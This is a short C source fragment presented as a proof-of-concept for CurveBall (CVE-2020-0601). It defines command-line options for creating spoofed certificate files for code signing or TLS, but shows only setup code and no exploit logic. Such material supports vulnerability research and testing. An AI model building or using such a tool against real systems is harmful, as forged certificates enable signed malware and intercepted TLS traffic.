#include <stdio.h>
#include <stdlib.h>
#include <argp.h>
#include <stdbool.h>
#include <openssl/ssl.h>

char doc[] = "CurveBall POC (CVE-2020-0601)";
char argsDoc[] = "ORIGINAL_CERT_FILE_NAME";

static struct argp_option options[] =
{
    { "sign", 's', 0, 0, "Creates certificate files for code signing" },
    { "tls", 't', 0, 0, "Creates certificate files for SSL/TLS" },
    { 0 }
};

struct arguments
{
    char *originalCertFileName;
    bool sign;
    bool tls;
};

static error_t parse_option(int key, char *arg, struct argp_state *state);

struct argp argp = { options, parse_option, argsDoc, doc };
